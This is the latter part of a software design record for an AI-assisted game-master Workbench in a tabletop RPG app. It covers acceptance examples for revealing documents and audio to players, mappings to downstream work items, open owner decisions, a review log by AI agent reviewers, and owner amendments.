| AE-50 | a Confirm in flight | the GM presses Escape, then clicks outside the sheet | both are inert; the sheet stays open and **Stop showing** works | REVEAL-5 |
| AE-51 | table clients joined, a document live | the GM rotates the link | every client shows the generic inactive screen; every projection is cleared; the session's divider and recap boundary are unchanged | REVEAL-17, TABLE-9 |
| AE-52 | a personal link already used on Gorath's phone | another player opens the same link | they see the generic inactive-link line; nothing is enrolled; the GM sees no new device | AUD-4, TABLE-16 |
| AE-53 | Gorath enrolled on one phone | Gorath enrols a second phone with a fresh link | the first phone loses `For you`; the GM sees `Gorath joined from a new device` | AUD-5 |
| AE-54 | the response to `/npc` is lost | the client waits, then the GM presses **Check again** | the lane showed `Checking on NPC…` and nothing re-ran; when the server reports done the link renders and exactly one document exists | RAIL-21 |
| AE-55 | a `working` lane | the GM cancels just as the provider finishes | `Cancelling…` shows, then the result is kept with `Finished before it could be cancelled` | RAIL-23 |
| AE-56 | the pilot's daily cap is spent; separately, a user's hourly window is spent | the GM runs a tool in each case | the first says the limit resets overnight and offers no retry; the second says when to try again | RAIL-20 |
| AE-57 | a dirty canvas | any Workbench call returns 401 | the banner offers **Sign in again** and **Copy my unsaved text**, which copies it | STATE-5 |
| AE-58 | the capability lookup fails | GM mode loads | every tool is disabled with the message and **Retry**; a plain message still sends | §12.2 |
| AE-59 | the NPCs category | the GM presses **New** | `Untitled NPC` opens in the canvas with its name selected, recorded under `author: gm` | LIB-12 |
| AE-60 | a monster card | the GM presses **Save to Bestiary** twice | one stat-block document exists; the second press opens it | LIB-11 |
| AE-61 | the NPCs category | the GM types `ond` | after 250 ms one request goes out whose body carries the text and whose URL does not | LIB-20, X-7 |
| AE-62 | 26 NPCs | the list opens, then **Load more** | 25 rows, then the 26th appended without reordering | LIB-23 |
| AE-63 | a live document archived under AE-45 | the GM presses **Undo** | the document returns; the table still shows waiting | LIB-16 |
| AE-64 | an archived document linked from the thread | the GM deletes it and confirms | the dialog named it; its link now yields the generic unavailable state | LIB-18, CANVAS-31 |
| AE-65 | the draft `/npc the ferryman` in the GM channel | the GM switches to Sage, then back | Sage's composer is empty; the GM conversation's draft is restored | RAIL-25 |
| AE-66 | an assistant answer in a lane containing a remote Markdown image, a `<video src>` and a `style` with `url()`, all pointing at `example.test` | it renders | no request leaves for `example.test` | X-10 |
| AE-67 | a live document whose revealed `notes` was rewritten after the pin | **Player-safe copy** | the dialog opens on **What the table sees** and previews the pinned text; the file holds the pinned text | EXPORT-3 |
| AE-68 | a session at its connection limit | one more client joins | it sees `This table is full` | REVEAL-25, TABLE-12 |
| AE-69 | a guest connected | the GM reveals Gorath's sheet to Gorath, then stops it | the guest's connection receives no event, no sequence change and no forced snapshot | REVEAL-24 |
| AE-70 | a table client showing a document | the phone locks, then unlocks | the page is blank until a fresh snapshot arrives | TABLE-11 |
| AE-71 | an edit armed, with the draft `make her older` | the GM taps **NPC** | the edit target clears, which is announced; the draft is `/npc make her older` | CANVAS-22, RAIL-4 |
| AE-72 | the draft `/npc the ferryman` | the GM presses **Edit with assistant** | the edit is not armed; `Clear the /command first` | CANVAS-22 |
| AE-73 | Ondrey open in the canvas, and something live | the GM switches to Rules, then back | Rules looks exactly as it does today apart from the live indicator; on return the canvas shows Ondrey | CANVAS-9, X-9 |
| AE-74 | tab 1, offline, has a cue card's Stop for the chant waiting to retry; tab 2 pushes the storm | tab 1 reconnects | the storm keeps playing | AUDIO-9 |
| AE-76 | ambience A live and a push of B sent | the GM presses the live strip's **Stop**, and B commits first | both slots are cleared; nothing sounds | AUDIO-9, AUDIO-28 |
| AE-77 | a table client showing a document | the phone locks and unlocks while nothing changes on the server | the page is blank, then shows the same document again from a fresh snapshot | AUDIO-15, TABLE-11 |
| AE-78 | a remote player with the table in a background tab | the GM pushes ambience | it plays; the document area is blank until the tab is shown again | X-4, AUDIO-22 |
| AE-79 | two tabs on the same document; tab A's `voice` edit has been absorbed into the open working version | tab B saves `voice` on its stale revision | a 409; tab A's text is not overwritten | CANVAS-19, CANVAS-34 |
| AE-80 | the reveal sheet open on a document | another tab saves an edit to a ticked field, then the GM confirms | the table gets exactly the text the sheet displayed | REVEAL-5, CANVAS-34 |
| AE-81 | a live document whose `notes` was rewritten after the pin | the GM opens its sheet from the canvas header and ticks `qualifier` | the pin is kept; `qualifier` previews its pinned text; **Use latest version** is offered and shows old beside new | REVEAL-8 |
| AE-82 | something live, the GM in the Rules channel | the GM activates a listed projection | the app returns to the GM channel; no sheet opened in Rules | REVEAL-14, X-9 |
| AE-83 | a player on the table page | the page reloads | they rejoin without the original link, because the device holds its session-scoped table credential | REVEAL-19 |
| AE-84 | a slow tool attempt that the server has expired, and a retry that has finished | the slow attempt's result arrives | it is discarded; exactly one document exists | RAIL-27 |
| AE-75 | a recap document and a live session | the GM opens the reveal sheet | every toggle is off, and the recap row carries its warning | REVEAL-23 |

## 16. What downstream beads must honour

The first table lists every place found so far where this record **refines,
narrows or gives a specific reading to** a bead's text; a bead that finds
another should add it here. The second is pointers.

| Bead | Its text | This record's reading |
| --- | --- | --- |
| `1kg.3.3` | "tapping a tool never fires an empty billable request" | Stands for taps. An explicit submit of a brief-optional tool (`/recap`) is allowed (X-1, RAIL-5). |
| `1kg.4.1` | "empty/oversized briefs … fail before provider work"; "brief/context bounds" | Empty briefs fail **unless the registry marks the tool brief-optional**. The context bound applies to context the *server* assembles; the client sends none (RAIL-7). |
| `1kg.3.5`, `1kg.4.5` | pending work "cannot lock unrelated composer actions"; "does not block unrelated navigation" | Read strictly: a working lane never disables Send. The only block is the server's cap (X-5, RAIL-16). |
| `1kg.4.5` | "runs validated next-tool suggestions" | A suggestion **arms** the composer; the GM runs it (RAIL-8). |
| `1kg.5.1`, `1kg.5.2`, `1kg.5.5` | "stale base revisions return a conflict"; versions are immutable | A conflict arises **when a field the write touches changed after its base** (CANVAS-19). "Immutable" is read as "immutable once sealed" (CANVAS-34). |
| `1kg.6.4` | "archive/delete with confirmation" | A dialog for delete and for archiving something live; Undo for a plain archive (LIB-16 to LIB-18). |
| `1kg.7.4`, `1kg.2.3` | "participant name/audience entry"; "participant display identities"; a `/t/` route | No free-text names; identity comes only from enrolment (AUD-7). The table client is its own entry point, its token rides in the fragment, and no credential appears in any request URL (REVEAL-19). |
| `1kg.8.7` | "one browser gesture per session" | One tap **per page load** (AUDIO-18). |
| `1kg.8.1`, `1kg.8.5` | upload **and** approved remote import; "signed/streaming reads" | Both stay in the epic; upload ships first, import behind its own flag after the SSRF policy (AUDIO-25). Signed URLs are allowed for *table* reads only under REVEAL-21's short bound, and that trade-off is `1kg.1.4`'s. |
| `1kg.7.2` | projections built "from current authorized revisions" | From the **pinned** sealed version, not the current one (REVEAL-8). |
| `1kg.7.5`, `1kg.8.6` | "monotonic revisions" | A GM-only session epoch plus a sequence per slot; no position ticks (REVEAL-22, REVEAL-24, AUDIO-11, AUDIO-28). |
| `1kg.5.2` | "Direct patches create author=gm revisions" | Each patch is a `gm` write that advances the write revision; history groups a burst of them into one version (CANVAS-34). |
| `1kg.3.3` | "durable user pin order"; "five unique enabled tools" | Durable per device (RAIL-12, E-7). A tool must be enabled *when pinned*; a pin that later becomes disabled persists and counts (RAIL-10, RAIL-11). |
| `1kg.4.1` | "legacy /chat is unchanged" | Kept: the Workbench cap does not count `/chat` (X-5). STATE-8's durable counting must not loosen `/chat`'s existing guards. |

| Bead | Decisions it implements |
| --- | --- |
| `1kg.1.2` wire schemas | RAIL-6 to RAIL-9; the lane states and the status read (RAIL-15 to RAIL-24, RAIL-27); the write revision (CANVAS-34); field patches with a base revision and ISO timestamps (CANVAS-10, CANVAS-19, CANVAS-27); the reveal mutation, explicit masks, epoch and sequences (REVEAL-5, REVEAL-9, REVEAL-22, REVEAL-24); audiences (AUD-2); slot state, snapshots and events carrying neither names nor titles, named and stop-all Stops, and the audio epoch (AUDIO-9, AUDIO-11, AUDIO-15, AUDIO-21, AUDIO-28, AUDIO-29) |
| `1kg.1.3` threat model | X-4, X-7, X-10; REVEAL-19 to REVEAL-25; AUD-3 to AUD-12; TABLE-9, TABLE-13; AUDIO-21, AUDIO-25; EXPORT-3, EXPORT-7, EXPORT-10 |
| `1kg.1.4` storage and realtime | X-4; REVEAL-17, REVEAL-21, REVEAL-25; TABLE-6, TABLE-7, TABLE-11; AUDIO-11 to AUDIO-17, AUDIO-24 to AUDIO-26, AUDIO-28 |
| `1kg.1.5` migrations and repositories | Transactions this record needs: the atomic reveal mutation (REVEAL-5); stop-and-archive, stop-and-unlink and stop-and-remove (LIB-17, AUD-15, AUD-16); a transactional hook for whatever fanout `1kg.1.4` chooses (AUDIO-24). The durable record of billable operations (STATE-8) is `agent-forge-harness-yje.5.1`'s ledger, not a table of this bead's |
| `1kg.2.2`, `1kg.2.3` | REVEAL-1, REVEAL-2, REVEAL-17, REVEAL-20, REVEAL-25; AUD-4, AUD-5, AUD-13 to AUD-18 |
| `1kg.2.5` campaign context | RAIL-13; LIB-25; the campaign-picker row of §12.2 |
| `1kg.3.1` registries | New registry fields: `aliases`, brief policy, working label, capability, library category, reveal allowlist, reveal groups, reveal warnings, audience, a per-audience default mask. Validators: SLASH-2, RAIL-11. X-8. Human labels for stat cells (the handoff renders raw keys such as `xpBudget`) and no HTML entities in strings (`Terrain &amp; hazards`). |
| `1kg.3.2` assistant lane | RAIL-15 to RAIL-24 and RAIL-27 — `cancelled` and `unknown`, no children while working or in error; `Markdown` under X-10; the link copy in CANVAS-3 |
| `1kg.3.3` rail and slash | all of §3 and §4; RAIL-25 (per-conversation drafts); `TextField` must forward a ref and ARIA attributes (SLASH-12) |
| `1kg.3.4`, `1kg.3.5` | RAIL-9, RAIL-14, RAIL-16, RAIL-26; the recap boundary in §3.3; NG-12 |
| `1kg.4.1`, `1kg.4.6` | RAIL-5 to RAIL-7, RAIL-18 to RAIL-24, RAIL-27 (including attempt fencing); X-5 enforced by the server; STATE-8 |
| `1kg.4.4`, `1kg.4.5` | X-5, X-6; RAIL-8, RAIL-16; CANVAS-1 to CANVAS-4; the recap boundary |
| `1kg.5.3`, `1kg.5.6` | REVEAL-4, REVEAL-10, REVEAL-11, REVEAL-23; LIB-6, LIB-11 to LIB-13; plain-text fields and size caps (X-10, RAIL-6) |
| `1kg.6.1` to `1kg.6.3`, `1kg.6.5` | §5 and §10 |
| `1kg.6.4` library | all of §6, and the Participants panel of §8.2 |
| `1kg.6.6` export | all of §9 |
| `1kg.7.1` to `1kg.7.5` | §7 and §8 |
| `1kg.8.2`, `1kg.8.4` to `1kg.8.7` | §11 |
| `1kg.9.1` to `1kg.9.4` | AE-25, AE-27, AE-31 to AE-33, AE-48 to AE-53, AE-66 to AE-70 (privacy and safety); AE-42, AE-74 (multi-instance, multi-tab); AE-36, AE-37 (responsive); Workbench traces are masked (X-7) |

## 17. Decisions that await the owner's confirmation

Each of these changes what the product *is*, not merely how it behaves. Each has
a default in force so that work is not blocked. Confirming or changing one is
cheap now and dear after its dependants ship.

| ID | Default in force | Alternatives | Dear to change after |
| --- | --- | --- | --- |
| E-1 | The owner audience is proven by **enrolling each participant's device through a single-use personal link** (AUD-3 to AUD-5) | Drop the owner audience from v1; or require player accounts | `1kg.2.1`, `1kg.7.1` |
| E-2 | **One live document per audience slot**, and no player-side history (REVEAL-7) | A shelf of everything revealed this session | `1kg.7.1`, `1kg.7.4` |
| E-3 | The table sees a **pinned version**; the GM reviews and pushes updates (REVEAL-8) | Follow the current version live, perhaps per type | `1kg.7.1`, `1kg.7.2` |
| E-4 | Audio ships **upload-first**, with remote import later behind its own flag; pushes start at zero; there is no table pause or seek (AUDIO-8, AUDIO-25) | Import in the first audio release; table seek and pause | `1kg.8.1`, `1kg.8.6` |
| E-5 | **Every plain GM message is answered**, and there are no player-authored turns (RAIL-14). This is also why a recap is never pre-ticked for reveal (REVEAL-23). | Narration-only turns; table chat | `1kg.3.4`, `1kg.4.2` |
| E-6 | **One GM per campaign; players have no accounts** (AUD-1) | Co-GMs; authenticated players | `1kg.2.1`, `1kg.1.3` |
| E-7 | Rail pins live **per device** (RAIL-12) | A server-side preference | `1kg.3.3` — cheap either way |
| E-8 | **Today's guards stay in force** — 20 an hour per user, 500 a day for the whole pilot — although STATE-8 shows they do not fit the Workbench. The owner must choose its limits, with evidence, before any tool is enabled. Epic `agent-forge-harness-yje` owns per-account budgets and the cost ledger, so this is decided there, not twice. Two facts matter to that decision: one GM's prep session can spend every tester's day, and tool turns must be counted durably or they escape the daily cap altogether (STATE-8). | A separate tool budget; a per-user daily sub-cap; a higher shared limit; per-campaign budgets | `1kg.4.1`, before any tool is enabled |
| E-9 | **Tools and document edits start only from an explicit command or an explicit arming**, never from the assistant's reading of a conversational message (RAIL-2, CANVAS-21, CANVAS-22). This narrows the handoff's flagship "ask in chat". | Natural-language routing; an edit target that stays armed | `1kg.4.5`, `1kg.5.5`, `1kg.6.5` |
| E-10 | **Guests are anonymous**; nobody types a name (AUD-7) | A name prompt on joining | `1kg.7.4`, `1kg.8.7` |

## 18. Review log

**2026-09-16.** The first draft was reviewed by two independent reviewers
working read-only from the record, the archive, the plan and the repository.
The revision was then checked by a third, whose brief was to decide whether
each serious finding was really resolved and whether the rewrite had broken
anything. All three were agents of the same model tier as the author. **No
human has reviewed this record**; §17 lists what the owner should confirm.

| Review | Lens | Findings |
| --- | --- | --- |
| A | Fidelity to the archive, the repository and the plan; coverage of the acceptance criteria | 1 blocker, 4 high, 8 medium, 9 low. About 115 factual claims were checked and held; every quotation of the archive was accurate. |
| B | Security, privacy, internal consistency, implementability | 1 blocker, 12 high, 25 medium, 12 low. |
| Author | Consistency pass while the reviews ran | 6 issues, 5 of which the reviewers also found. |
| C | Verification of the revision: are the 16 most serious findings resolved, and did the rewrite introduce contradictions? | 11 resolved, 5 partly. New: 1 high, 10 medium, 13 low. About 70 cross-references were checked for meaning and none pointed at the wrong decision; no statement about the archive or the repository was found false. |

### Round one

Every blocker and high finding was accepted. Review C judged eleven of these
resolved and five only partly; round two, below, closes those.

| Finding | Resolution |
| --- | --- |
| B: "Stop always wins" could lose a race with an in-flight Confirm, and Escape could hide one | REVEAL-5 (pending sheet), REVEAL-22 and AUDIO-28 (every Stop advances the epoch; stale widenings are refused and never retried); AE-48 to AE-50 |
| B: a one-tap Update and a player-safe export both bypassed the pinned version | REVEAL-8 (Update goes through the sheet and shows old beside new); EXPORT-3 (**What the table sees**, with a text preview); AE-29, AE-67 |
| B: many live slots but one indicator and an unscoped Stop | REVEAL-6, REVEAL-14 (one indicator lists everything; **Stop all**); LAYOUT-5, LAYOUT-10 |
| B: reveal seeds ignored the audience; a recap was pre-ticked | REVEAL-4, REVEAL-23; AE-75 |
| B: the participant claim was a reusable bearer secret | AUD-4, AUD-5 (single-use enrolment, one device, GM notice); AE-52, AE-53 |
| B: a header-borne token cannot work for streams or media; asset reads after Stop | REVEAL-19, REVEAL-21, restated as requirements |
| B: the invocation lifecycle had billing and deadlock holes | RAIL-18, RAIL-21, RAIL-23, RAIL-27; X-5 is now server-enforced |
| A and B: the cost guards were misdescribed, and tool turns would escape the daily cap | §1.2, RAIL-20, STATE-8, E-8 |
| A and B: X-9 contradicted CANVAS-9; an un-keyed draft leaks across channels | X-9, CANVAS-9 (the canvas is GM-channel only; live indicators follow everywhere), RAIL-25; AE-65, AE-73 |
| B: an armed edit and an armed tool could collide | CANVAS-22; AE-71, AE-72 |
| B: the shipped Markdown component loads remote images, an exfiltration path | X-10; AE-66; filed separately as a bug against today's code |
| A: 25 decisions carried no basis tag, and two blanket provenance claims were false | Basis columns on tables 3.4, 5.3, 7.2 and 10.1; basis notes on the example tables; §6 and §14 corrected |
| A: §16 did not list every bead it refined | §16's first table |
| A: this log did not exist | this section |

Round one's medium and low findings were accepted unless listed here:

| Finding | Disposition |
| --- | --- |
| A: CANVAS-1 departs from plan invariant 3 ("document results link to the canvas") | **Kept.** The link now always renders, so the invariant holds; the one implicit open is what `1kg.6.3`'s "a second document result follows the … rule" presupposes. Retagged `S + I`, and the plan's table names invariant 3. |
| B: Stop should carry a list of the widenings it voids | **Declined as a mechanism.** Advancing the epoch on every Stop already refuses them in either order. |
| B: enforce one operation per conversation on the server | **Replaced** by a per-user cap, because review A showed a per-conversation lock contradicts `1kg.3.5` and `1kg.4.5`. |
| B: give the Workbench its own daily sub-cap now | **Declined as a default** — it is a number for the owner (E-8). The requirement behind it is STATE-8. |
| B: accumulate autosaves in an open working version | **Adopted as the recommended mechanism**, with display-time grouping allowed (CANVAS-34). |
| A wanted Back to close full-screen views; B wanted `replaceState` only | `replaceState` is fixed (CANVAS-30); Back handling is left to `1kg.6.3` under LAYOUT-11. |
| B: tight audio sync is costly and pointless given AUDIO-27 | **Adopted.** The scheduled start was dropped and the targets relaxed (AUDIO-12, AUDIO-13). |

### Round two

Review C's findings were all accepted:

| Finding | Resolution |
| --- | --- |
| **High.** An open working version that absorbs autosaves kept one version number while its content changed, so a stale write could silently overwrite newer work, and a pin could differ from the text the GM reviewed | CANVAS-34 now separates a **write revision**, with per-field tracking, from history versions; opening the reveal sheet or an export dialog seals the working version first; AE-79, AE-80 |
| X-3 still described per-slot revisions | X-3 now speaks of the session epoch |
| "Commands one at a time" would queue a Stop behind a hung Confirm | REVEAL-22, AUDIO-28: a Stop is never queued; only a widening waits, and only for this client's own unacknowledged Stops, and it can be withdrawn |
| The live strip's Stop named one cue, so a push in flight could survive it | AUDIO-9: the strip's Stop is a Stop all; cue cards keep named Stops; AE-76 |
| "Never apply a snapshot below the high-water mark" left a blanked page blank for ever | AUDIO-15: marks are per slot and reset on blank or reconnect; AE-77 |
| X-4 withdrew audio on a hidden page, against AUDIO-22 | X-4: only documents are withdrawn on hide; AE-78 |
| A personal link has no session token, yet an example had its second opener join as a guest; enrolled players had no stated path back to the table | TABLE-15, TABLE-16; AUD-4 (codes expire); AE-52 |
| A stripped token plus "nothing kept" would lock a player out on reload | REVEAL-19, X-4, X-7: a session-scoped table credential persists until End, Rotate or expiry; AE-83 |
| Banning every signed URL overrode `1kg.8.1` without saying so, and would force all table media through a small service | REVEAL-21 is now a bound, and the trade-off is `1kg.1.4`'s; §16 lists it, with five more refinements the first table had missed |
| A sheet opened on a live document from the header re-pinned every revealed field with no diff | REVEAL-5, REVEAL-8: every ticked row previews its text; a live sheet keeps the pin unless the GM chooses **Use latest version**; AE-81 |
| The connection cap was per session only, so three tables could still starve the service | REVEAL-25 adds a service-wide ceiling |
| The indicator's rows could open the reveal sheet from Sage, Spell or Rules | REVEAL-14: Stop-only outside the GM channel; AE-82 |
| The Workbench cap would have changed `/chat` | X-5 counts tool invocations and AI edits only |
| A retried slow attempt could save a second document | RAIL-27: attempts are fenced; AE-84 |
| A replayed pending-stop marker could kill a later, deliberate reveal | REVEAL-16: the marker is scoped to its session and epoch |
| Smaller items: the banner flashing on a healthy stream; X-9's "single difference"; undefined "workspace header"; an armed edit surviving a canvas switch; several weak `Proves` citations and swept-in ID ranges; the legend's promise that every S row cites a file; E-8's "no default" | TABLE-6; X-9; REVEAL-14; CANVAS-22; §15 and §16; §1.1; E-8 and STATE-8 |

Two residues are accepted rather than fixed, and are handed to `1kg.1.3`: an
enrolment code intercepted *before* its owner uses it enrols the wrong device,
and the GM sees only `Joined`; and X-10 requires a Content-Security-Policy for
the table client, while the authenticated app's is tracked separately as
`agent-forge-harness-va8`.

**After round two.** Two epics were created by another session while this record was being written: `agent-forge-harness-yje` (open accounts, billing, per-account budgets and an operation cost ledger) and `agent-forge-harness-xiu` (additive retrieval with a bounded web fallback). They change no decision here. They are cross-referenced where they touch one: STATE-8 and E-8 now point at the ledger and budgets `yje` owns, and AUD-1 notes that open registration would remove the invite argument against player accounts, which the owner should weigh under E-1 and E-6.

The round-two changes were not themselves independently re-verified. They were
checked mechanically — every ID defined once, every cross-reference resolving,
every table well formed — and by the author against each finding.

## 19. Amendments

Decisions this record left to a later bead, now made there. Rows A-1 to A-18
reverse nothing: each closes something a row above left open, and the row's own
text stands as written. **Rows A-19 to A-22 are different: they are the owner's
decisions of 2026-09-20, and they amend the rows they name.** A downstream bead reads the row and then this table.

| # | Decision | Amendment | Made by |
| --- | --- | --- | --- |
| A-1 | REVEAL-19 | The mechanism is fixed: one POST exchanges the token for an `HttpOnly; SameSite=Strict; Path=/table` cookie, `Secure` under the session cookie's switch; every table route, the realtime channel and table assets live under `/table/`. | threat model SEC-6, SEC-8 |
| A-2 | REVEAL-21 | Table media is served **same-origin** by the service, a read authorised against the live slot every time and re-checked every 1 MB; a cross-origin signed URL is ruled out, and the 60 s signed-read alternative is not taken. | threat model SEC-16; media ADR MS-7 |
| A-3 | AUD-5, E-1 | The interception residue is accepted *conditionally* (threat model S-3): if any amendment lets a participant slot carry more than a player's own sheet, enrolment gains GM approval of each new device before owner-only content flows. | threat model §12.1 |
| A-4 | X-7 | Two more places private text was reaching: the framework's default 422 echoes request input, and a tracing callback records prompts. Both are closed by rule. | threat model SEC-23, SEC-24 |
| A-5 | REVEAL-25 | A per-generation credential bound of 24 (*suggested*), with eviction only of a credential idle for 30 minutes; the connection bounds are numbers — 12 per session, 3 per device, a service-wide ceiling of 20 open streams of which 4 are the GM's, counted in a `connections` table under a per-session lock, and no per-instance cap. | threat model SEC-10; media ADR RT-8 |
| A-6 | REVEAL-25, TABLE-10 | Successful joins gain a loose per-source and per-generation throttle, so the eviction rule cannot be farmed; failed joins keep the tight one. | threat model SEC-10 |
| A-7 | TABLE-13 | Enrolment ignores every cookie it receives, and a device holds one participant per campaign; the guest line stays. | threat model SEC-11 |
| A-8 | EXPORT-8 | Every export neutralises remote references in model-authored text, the GM copy included, not only the player-safe copy. | threat model SEC-33 |
| A-9 | X-3 | An End and a Rotate stay unqueued and unrefusable for state, and gain a per-campaign bound; a Stop gains nothing. | threat model SEC-35 |
| A-10 | AUDIO-24 | The mechanism is chosen: Postgres-held state, `LISTEN`/`NOTIFY` as a wake-up, delivery from the state itself, a job outbox, per-instance fanout. | media ADR RT-5 |
| A-11 | TABLE-6 | The platform's 300 s cut becomes a jittered 240–280 s server-side close with a `reconnect` frame; the banner rule is unchanged. | media ADR RT-3 |
| A-12 | AUDIO-26 | Audio is re-encoded to MP3 and images within their family; the formats accepted are unchanged. | media ADR MS-6 |
| A-13 | REVEAL-24, TABLE-7 | A snapshot ends with a `ready` frame, the boundary before which nothing is trusted; a table frame carries no link generation and no epoch. | media ADR RT-4; wire contract slice 5 |
| A-14 | REVEAL-9, CANVAS-19 | The flat field key is also the unit of **eligibility**, shared with the Live Session Assistant: there are no nested paths, and a secret that needs its own eligibility is its own top-level field (`1kg.5.3`). | shared eligibility ADR ED-2, ED-3 |
| A-15 | REVEAL-5 | Reveal ships **mask-only** in v1: the GM's Confirm is the authorisation. Eligibility binds reveal only from the Live Session Assistant's enforcement release (`1ir.11.1`), and only for a campaign whose GM has switched it on — a narrowing that stops every live display it would refuse. Confirm then gains one precondition, checked before the session row is touched (SEC-3's order). **From that release the reveal sheet shows classes and may set them inside a Confirm that lists every change** — the owner's decision O-6, under the six conditions of shared ADR ED-13; v1's sheet is unchanged. | shared eligibility ADR ED-9, ED-11, ED-13, M-1 to M-4, M-8 |
| A-16 | §7.1, REVEAL-7, NG-20 | `1kg.7.1` expresses what may be live where as data, not as a column on the document: slot rows reference a *disclosure*, and a partial unique index keeps a document to one live disclosure (the rule itself is amended by A-20). | shared eligibility ADR ED-15 |
| A-17 | X-3, REVEAL-22 | A display write takes the campaign's authorisation row `FOR SHARE` first, validates, and only then takes the session row and slots. **No narrowing asks for the authorisation lock before it has taken effect**: a Stop takes the session row only; an End, an expiry, a Rotate, a participant removal and a personal-link reset are effective under the session row and the participant row, and leave the `authz_revision` advance to a reconciliation under the lock; an unlink, an archive or a tightened class stops what it affects first, in the same way, and only then changes its fact under the lock — answered honestly as *not applied yet* when the lock cannot be had, never deferred to a job. So X-3, SEC-35 and A-9 stand unchanged. Widenings — participant add, a link towards a participant, session start — take the row `FOR UPDATE` first and may wait a bounded time. Every transaction holds the session row only for its write, with row locks that a foreign-key check does not conflict with; that write, and a connection, are what a Stop can wait for. Tightening eligibility advances the reveal epoch like any other narrowing. | shared eligibility ADR ED-12, RQ-1 to RQ-12, RC-1 to RC-15 |
| A-18 | AUD-9, NG-20, NG-22, NG-25, X-2 | The four amendments the Live Session Assistant plan requests were first answered with their fallbacks; **the owner decided them on 2026-09-20 — see A-19 to A-22.** | shared eligibility ADR section 7 |
| A-19 | AUD-9, NG-22, A-3 | **Owner decision O-2:** a participant audience is open to every document type; the registry's `audience` flag now says only whose default reveal a type seeds. Because a participant slot can then carry GM-authored secrets, A-3's condition is met: **a newly enrolled device is pending until the GM approves it**, a pending device sees the table slot only, and approval — not enrolment — replaces a participant's previous device (`1kg.2.9`). | owner, 2026-09-20; shared eligibility ADR ED-14, ED-25 |
| A-20 | §7.1, REVEAL-6, REVEAL-7, REVEAL-22, NG-20 | **Owner decision O-3:** group displays ship as per-recipient copies. A slot still holds one live document; **a document has at most one live disclosure**, which is the table slot alone or one or more participant slots. Stop on the document clears every copy in one transaction; revealing it to a new audience replaces the whole previous disclosure; a member's removal stops that member's copy; an addition displays nothing. Nothing on the table side shows that a display is one copy of several (REVEAL-24). | owner, 2026-09-20; shared eligibility ADR ED-15 |
| A-21 | X-2 | **Owner decision O-4:** for *re-displays* in the Live Session Assistant's Phase 5, a rule the GM wrote and enabled — naming documents or excerpts, fields, audience and trigger — is the explicit GM action. A first disclosure always needs a Confirm; a GM Stop disables that rule's re-display of that subject until the GM re-arms it. Workbench v1 ships no automation. | owner, 2026-09-20; shared eligibility ADR ED-17, section 7.3 |
| A-22 | §7.1 slot model, REVEAL-5, REVEAL-9, NG-25 | **Owner decision O-5:** a reference-excerpt slot content kind for deterministic, cited rules text is approved in principle and **gated**: no excerpt reaches a player device before the licensing review (`agent-forge-harness-yje.6.1`) lands. | owner, 2026-09-20; shared eligibility ADR section 7.4 |
